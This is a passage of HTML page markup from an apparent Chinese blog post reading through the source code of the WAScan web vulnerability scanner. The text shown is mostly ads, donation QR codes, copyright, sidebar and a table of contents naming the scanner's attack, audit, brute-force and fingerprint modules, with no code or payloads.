class="headerlink" title="plugins/fingerprint/waf/denyall.py"></a>plugins/fingerprint/waf/denyall.py</h3><h3 id="plugins-fingerprint-waf-radware-py"><a href="#plugins-fingerprint-waf-radware-py" class="headerlink" title="plugins/fingerprint/waf/radware.py"></a>plugins/fingerprint/waf/radware.py</h3><h3 id="plugins-fingerprint-waf-expressionengine-py"><a href="#plugins-fingerprint-waf-expressionengine-py" class="headerlink" title="plugins/fingerprint/waf/expressionengine.py"></a>plugins/fingerprint/waf/expressionengine.py</h3><h3 id="plugins-fingerprint-waf-armor-py"><a href="#plugins-fingerprint-waf-armor-py" class="headerlink" title="plugins/fingerprint/waf/armor.py"></a>plugins/fingerprint/waf/armor.py</h3><h3 id="plugins-fingerprint-waf-webknight-py"><a href="#plugins-fingerprint-waf-webknight-py" class="headerlink" title="plugins/fingerprint/waf/webknight.py"></a>plugins/fingerprint/waf/webknight.py</h3>
      
  </div>
    <div>
      
        <!-- Google AdSense start -->
        <!-- test3 -->
<ins class="adsbygoogle2"
     style="display:block"
     data-ad-client="ca-pub-3467872413268634"
     data-ad-slot="2179835194"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle2 = window.adsbygoogle2 || []).push({});
</script>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- test -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3467872413268634"
     data-ad-slot="5815348948"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
        <!-- Google AdSense end -->
      
    </div>

    <div>
      
        
  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
    <div>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
    <div id="QR" style="display: block;">
      
        <div id="wechat" style="display: inline-block">
          <img id="wechat_qr" src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/wechat.png" alt="chybeta WeChat Pay"/>
          <p>微信打赏</p>
        </div>
      
      
        <div id="alipay" style="display: inline-block">
          <img id="alipay_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/alipay.jpg?raw=true" alt="chybeta Alipay"/>
          <p>支付宝打赏</p>
        </div>
      
    </div>
  </div>


      
    </div>
	<div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
  <!-- JS库 sweetalert 可修改路径 -->
  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
  <p><span>本文标题:</span><a href="/2019/01/04/WAScan源码阅读/">WAScan源码阅读</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
  <p><span>发布时间:</span>2019年01月04日 - 08:01</p>
  <p><span>最后更新:</span>2019年01月06日 - 16:01</p>
  <p><span>原始链接:</span><a href="/2019/01/04/WAScan源码阅读/" title="WAScan源码阅读">http://chybeta.github.io/2019/01/04/WAScan源码阅读/</a>
    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2019/01/04/WAScan源码阅读/"  aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
</div>
<script>
    var clipboard = new Clipboard('.fa-clipboard');
    clipboard.on('success', $(function(){
      $(".fa-clipboard").click(function(){
        swal({
          title: "",
          text: '复制成功',
          html: false,
          timer: 500,
          showConfirmButton: false
        });
      });
    }));
</script>


      
	</div>
    <div>
      
        

      
    </div>



    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/源码阅读/" rel="tag"># 源码阅读</a>
          
            <a href="/tags/扫描器/" rel="tag"># 扫描器</a>
          
            <a href="/tags/安全开发/" rel="tag"># 安全开发</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/" rel="next" title="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
                <i class="fa fa-chevron-left"></i> phpcms 2008 type.php 前台代码注入getshell漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2099/01/06/Security-Weekly/" rel="prev" title="Security Weekly">
                Security Weekly <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      

          </div>
          


          
  <div class="comments" id="comments">
    
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="chybeta" />
          <p class="site-author-name" itemprop="name">chybeta</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">189</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">108</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-block">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              Links
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.lzhtony.com/" title="lzhtony" target="_blank">lzhtony</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://findneo.github.io/" title="findneo" target="_blank">findneo</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://cltheorem.github.io/" title="cltheorem" target="_blank">cltheorem</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.cnblogs.com/frankscode/" title="Frank" target="_blank">Frank</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#要求"><span class="nav-number">1.</span> <span class="nav-text">要求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#整体功能"><span class="nav-number">2.</span> <span class="nav-text">整体功能</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#指纹识别"><span class="nav-number">2.1.</span> <span class="nav-text">指纹识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查"><span class="nav-number">2.3.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暴力攻击"><span class="nav-number">2.4.</span> <span class="nav-text">暴力攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">2.5.</span> <span class="nav-text">信息搜集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#整体结构"><span class="nav-number">3.</span> <span class="nav-text">整体结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#入口文件：wascan-py"><span class="nav-number">4.</span> <span class="nav-text">入口文件：wascan.py</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lib-parser-文件夹"><span class="nav-number">5.</span> <span class="nav-text">lib/parser 文件夹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信用卡：lib-parser-getcc-py"><span class="nav-number">5.1.</span> <span class="nav-text">信用卡：lib/parser/getcc.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP：lib-parser-getip-py"><span class="nav-number">5.2.</span> <span class="nav-text">IP：lib/parser/getip.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#邮箱：lib-parer-getmail-py"><span class="nav-number">5.3.</span> <span class="nav-text">邮箱：lib/parer/getmail.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#US-SSN-lib-parser-getssn-py"><span class="nav-number">5.4.</span> <span class="nav-text">US SSN: lib/parser/getssn.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓取解析-lib-parser-parse-py"><span class="nav-number">5.5.</span> <span class="nav-text">抓取解析: lib/parser/parse.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lib-request-文件夹"><span class="nav-number">6.</span> <span class="nav-text">lib/request 文件夹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#爬虫：lib-request-crawler-py"><span class="nav-number">6.1.</span> <span class="nav-text">爬虫：lib/request/crawler.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Agent：-lib-request-ragent-py"><span class="nav-number">6.2.</span> <span class="nav-text">User Agent： lib/request/ragent.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求：lib-requests-request-py"><span class="nav-number">6.3.</span> <span class="nav-text">请求：lib/requests/request.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lib-utils-文件夹"><span class="nav-number">7.</span> <span class="nav-text">lib/utils 文件夹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#package标识：lib-utils-init-py"><span class="nav-number">7.1.</span> <span class="nav-text">package标识：lib/utils/init.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本检查：lib-utils-check-py"><span class="nav-number">7.2.</span> <span class="nav-text">基本检查：lib/utils/check.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#颜色常量定义：-lib-utils-colors-py"><span class="nav-number">7.3.</span> <span class="nav-text">颜色常量定义： lib/utils/colors.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列举py文件：-lib-utils-dirs-py"><span class="nav-number">7.4.</span> <span class="nav-text">列举py文件： lib/utils/dirs.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#异常定义：lib-utils-exception-py"><span class="nav-number">7.5.</span> <span class="nav-text">异常定义：lib/utils/exception.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参数payload处理：lib-utils-params-py"><span class="nav-number">7.6.</span> <span class="nav-text">参数payload处理：lib/utils/params.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本攻击payload-lib-utils-payload-py"><span class="nav-number">7.7.</span> <span class="nav-text">基本攻击payload: lib/utils/payload.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#格式化打印：-lib-utils-printer-py"><span class="nav-number">7.8.</span> <span class="nav-text">格式化打印： lib/utils/printer.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#随机串生成：-lib-utils-rand-py"><span class="nav-number">7.9.</span> <span class="nav-text">随机串生成： lib/utils/rand.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件读取操作：lib-utils-readfile-py"><span class="nav-number">7.10.</span> <span class="nav-text">文件读取操作：lib/utils/readfile.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本设置：lib-utils-settings-py"><span class="nav-number">7.11.</span> <span class="nav-text">基本设置：lib/utils/settings.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码：-lib-utils-unicode-py"><span class="nav-number">7.12.</span> <span class="nav-text">编码： lib/utils/unicode.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#帮助信息：lib-utils-usage-py"><span class="nav-number">7.13.</span> <span class="nav-text">帮助信息：lib/utils/usage.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lib-handler-文件夹"><span class="nav-number">8.</span> <span class="nav-text">lib/handler 文件夹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#暴破：lib-handler-brute-py"><span class="nav-number">8.1.</span> <span class="nav-text">暴破：lib/handler/brute.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指纹：lib-handler-fingerprint-py"><span class="nav-number">8.2.</span> <span class="nav-text">指纹：lib/handler/fingerprint.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击：lib-handler-attacks-py"><span class="nav-number">8.3.</span> <span class="nav-text">攻击：lib/handler/attacks.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#审计：lib-handler-audit-py"><span class="nav-number">8.4.</span> <span class="nav-text">审计：lib/handler/audit.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集：lib-handler-disclosure-py"><span class="nav-number">8.5.</span> <span class="nav-text">信息搜集：lib/handler/disclosure.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爬虫：lib-handler-crawler-py"><span class="nav-number">8.6.</span> <span class="nav-text">爬虫：lib/handler/crawler.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整扫描：-lib-handler-fullscan-py"><span class="nav-number">8.7.</span> <span class="nav-text">完整扫描： lib/handler/fullscan.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lib-db-文件夹"><span class="nav-number">9.</span> <span class="nav-text">lib/db 文件夹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plugins-attacks"><span class="nav-number">10.</span> <span class="nav-text">plugins/attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-htmli-py"><span class="nav-number">10.1.</span> <span class="nav-text">plugins/attacks/htmli.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-phpi-py"><span class="nav-number">10.2.</span> <span class="nav-text">plugins/attacks/phpi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-ssi-py"><span class="nav-number">10.3.</span> <span class="nav-text">plugins/attacks/ssi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-bufferoverflow-py"><span class="nav-number">10.4.</span> <span class="nav-text">plugins/attacks/bufferoverflow.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-lfi-py"><span class="nav-number">10.5.</span> <span class="nav-text">plugins/attacks/lfi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-xss-py"><span class="nav-number">10.6.</span> <span class="nav-text">plugins/attacks/xss.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-xpathi-py"><span class="nav-number">10.7.</span> <span class="nav-text">plugins/attacks/xpathi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-crlf-py"><span class="nav-number">10.8.</span> <span class="nav-text">plugins/attacks/crlf.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-oscommand-py"><span class="nav-number">10.9.</span> <span class="nav-text">plugins/attacks/oscommand.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-ldapi-py"><span class="nav-number">10.10.</span> <span class="nav-text">plugins/attacks/ldapi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-headerxss-py"><span class="nav-number">10.11.</span> <span class="nav-text">plugins/attacks/headerxss.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-sqli-py"><span class="nav-number">10.12.</span> <span class="nav-text">plugins/attacks/sqli.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-xxe-py"><span class="nav-number">10.13.</span> <span class="nav-text">plugins/attacks/xxe.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-bashi-py"><span class="nav-number">10.14.</span> <span class="nav-text">plugins/attacks/bashi.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-blindsqli-py"><span class="nav-number">10.15.</span> <span class="nav-text">plugins/attacks/blindsqli.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-attacks-headersqli-py"><span class="nav-number">10.16.</span> <span class="nav-text">plugins/attacks/headersqli.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plugins-audit"><span class="nav-number">11.</span> <span class="nav-text">plugins/audit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-audit-apache-py"><span class="nav-number">11.1.</span> <span class="nav-text">plugins/audit/apache.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-audit-phpinfo-py"><span class="nav-number">11.2.</span> <span class="nav-text">plugins/audit/phpinfo.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-audit-xst-py"><span class="nav-number">11.3.</span> <span class="nav-text">plugins/audit/xst.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-audit-robots-py"><span class="nav-number">11.4.</span> <span class="nav-text">plugins/audit/robots.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-audit-open-redirect-py"><span class="nav-number">11.5.</span> <span class="nav-text">plugins/audit/open_redirect.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plugins-brute"><span class="nav-number">12.</span> <span class="nav-text">plugins/brute</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-params-py"><span class="nav-number">12.1.</span> <span class="nav-text">plugins/brute/params.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-backupfile-py"><span class="nav-number">12.2.</span> <span class="nav-text">plugins/brute/backupfile.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-backupdir-py"><span class="nav-number">12.3.</span> <span class="nav-text">plugins/brute/backupdir.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-adminpanel-py"><span class="nav-number">12.4.</span> <span class="nav-text">plugins/brute/adminpanel.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-backdoor-py"><span class="nav-number">12.5.</span> <span class="nav-text">plugins/brute/backdoor.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-commondir-py"><span class="nav-number">12.6.</span> <span class="nav-text">plugins/brute/commondir.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-brute-commonfile-py"><span class="nav-number">12.7.</span> <span class="nav-text">plugins/brute/commonfile.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plugins-disclosure"><span class="nav-number">13.</span> <span class="nav-text">plugins/disclosure</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-disclosure-errors-py"><span class="nav-number">13.1.</span> <span class="nav-text">plugins/disclosure/errors.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-disclosure-creditcards-py"><span class="nav-number">13.2.</span> <span class="nav-text">plugins/disclosure/creditcards.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-disclosure-emails-py"><span class="nav-number">13.3.</span> <span class="nav-text">plugins/disclosure/emails.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-disclosure-privateip-py"><span class="nav-number">13.4.</span> <span class="nav-text">plugins/disclosure/privateip.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plugins-disclosure-ssn-py"><span class="nav-number">13.5.</span> <span class="nav-text">plugins/disclosure/ssn.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#plugins-fingerprint"><span class="nav-number">14.</span> <span class="nav-text">plugins/fingerprint</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cms"><span class="nav-number">14.1.</span> <span class="nav-text">cms</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-plone-py"><span class="nav-number">14.1.1.</span> <span class="nav-text">plugins/fingerprint/cms/plone.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-wordpress-py"><span class="nav-number">14.1.2.</span> <span class="nav-text">plugins/fingerprint/cms/wordpress.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-silverstripe-py"><span class="nav-number">14.1.3.</span> <span class="nav-text">plugins/fingerprint/cms/silverstripe.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-adobeaem-py"><span class="nav-number">14.1.4.</span> <span class="nav-text">plugins/fingerprint/cms/adobeaem.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-joomla-py"><span class="nav-number">14.1.5.</span> <span class="nav-text">plugins/fingerprint/cms/joomla.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-drupal-py"><span class="nav-number">14.1.6.</span> <span class="nav-text">plugins/fingerprint/cms/drupal.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-cms-magento-py"><span class="nav-number">14.1.7.</span> <span class="nav-text">plugins/fingerprint/cms/magento.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#framework"><span class="nav-number">14.2.</span> <span class="nav-text">framework</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-symfony-py"><span class="nav-number">14.2.1.</span> <span class="nav-text">plugins/fingerprint/framework/symfony.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-cherrypy-py"><span class="nav-number">14.2.2.</span> <span class="nav-text">plugins/fingerprint/framework/cherrypy.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-seagull-py"><span class="nav-number">14.2.3.</span> <span class="nav-text">plugins/fingerprint/framework/seagull.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-horde-py"><span class="nav-number">14.2.4.</span> <span class="nav-text">plugins/fingerprint/framework/horde.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-cakephp-py"><span class="nav-number">14.2.5.</span> <span class="nav-text">plugins/fingerprint/framework/cakephp.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-zend-py"><span class="nav-number">14.2.6.</span> <span class="nav-text">plugins/fingerprint/framework/zend.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-play-py"><span class="nav-number">14.2.7.</span> <span class="nav-text">plugins/fingerprint/framework/play.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-phalcon-py"><span class="nav-number">14.2.8.</span> <span class="nav-text">plugins/fingerprint/framework/phalcon.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-nette-py"><span class="nav-number">14.2.9.</span> <span class="nav-text">plugins/fingerprint/framework/nette.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-spring-py"><span class="nav-number">14.2.10.</span> <span class="nav-text">plugins/fingerprint/framework/spring.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-karrigell-py"><span class="nav-number">14.2.11.</span> <span class="nav-text">plugins/fingerprint/framework/karrigell.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-grails-py"><span class="nav-number">14.2.12.</span> <span class="nav-text">plugins/fingerprint/framework/grails.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-web2py-py"><span class="nav-number">14.2.13.</span> <span class="nav-text">plugins/fingerprint/framework/web2py.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-flask-py"><span class="nav-number">14.2.14.</span> <span class="nav-text">plugins/fingerprint/framework/flask.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-yii-py"><span class="nav-number">14.2.15.</span> <span class="nav-text">plugins/fingerprint/framework/yii.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-codeigniter-py"><span class="nav-number">14.2.16.</span> <span class="nav-text">plugins/fingerprint/framework/codeigniter.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-fuelphp-py"><span class="nav-number">14.2.17.</span> <span class="nav-text">plugins/fingerprint/framework/fuelphp.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-larvel-py"><span class="nav-number">14.2.18.</span> <span class="nav-text">plugins/fingerprint/framework/larvel.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-asp-mvc-py"><span class="nav-number">14.2.19.</span> <span class="nav-text">plugins/fingerprint/framework/asp_mvc.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-apachejackrabbit-py"><span class="nav-number">14.2.20.</span> <span class="nav-text">plugins/fingerprint/framework/apachejackrabbit.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-django-py"><span class="nav-number">14.2.21.</span> <span class="nav-text">plugins/fingerprint/framework/django.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-rails-py"><span class="nav-number">14.2.22.</span> <span class="nav-text">plugins/fingerprint/framework/rails.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-framework-dancer-py"><span class="nav-number">14.2.23.</span> <span class="nav-text">plugins/fingerprint/framework/dancer.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#header"><span class="nav-number">14.3.</span> <span class="nav-text">header</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-header-header-py"><span class="nav-number">14.3.1.</span> <span class="nav-text">plugins/fingerprint/header/header.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-header-cookies-py"><span class="nav-number">14.3.2.</span> <span class="nav-text">plugins/fingerprint/header/cookies.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#language"><span class="nav-number">14.4.</span> <span class="nav-text">language</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-aspnet-py"><span class="nav-number">14.4.1.</span> <span class="nav-text">plugins/fingerprint/language/aspnet.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-perl-py"><span class="nav-number">14.4.2.</span> <span class="nav-text">plugins/fingerprint/language/perl.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-java-py"><span class="nav-number">14.4.3.</span> <span class="nav-text">plugins/fingerprint/language/java.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-coldfusion-py"><span class="nav-number">14.4.4.</span> <span class="nav-text">plugins/fingerprint/language/coldfusion.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#plugins-fingerprint-language-python-py"><span class="nav-number">14.4.5.</span> <span class="nav-text">plugins/fingerprint/language/python.py</span></a></li><li class="nav-item 